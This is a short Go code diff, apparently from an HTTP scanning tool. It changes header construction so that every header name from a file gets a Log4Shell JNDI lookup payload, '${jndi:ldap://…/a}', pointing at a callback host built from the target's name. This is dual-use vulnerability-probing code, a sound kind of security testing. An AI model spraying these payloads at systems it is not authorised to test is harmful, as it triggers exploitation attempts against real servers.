@@ -834,21 +834,13 @@ retry:
 		}
 		defer head.Close()
 		scanner := bufio.NewScanner(head)
-		if strings.Contains(hp.Options.DNS4J, "REPLACEME") {
-			for scanner.Scan() {
-				hp.CustomHeaders[scanner.Text()] = fmt.Sprintf("${jndi:ldap://%s/a}", strings.Replace(hp.Options.DNS4J, "REPLACEME", URL.Host, 1))
-			}
-			if err := scanner.Err(); err != nil {
-				log.Fatal(err)
-			}
-		} else {
-			for scanner.Scan() {
-				hp.CustomHeaders[scanner.Text()] = hp.Options.DNS4J
-			}
-			if err := scanner.Err(); err != nil {
-				log.Fatal(err)
-			}
-
+		numLines := 0
+		for scanner.Scan() {
+			hp.CustomHeaders[scanner.Text()] = fmt.Sprintf("${jndi:ldap://%s/a}", strings.Replace(hp.Options.DNS4J, "REPLACEME", URL.Host + strconv.Itoa(numLines), 1))
+			numLines++
+		}
+		if err := scanner.Err(); err != nil {
+			log.Fatal(err)
 		}
 
 	}
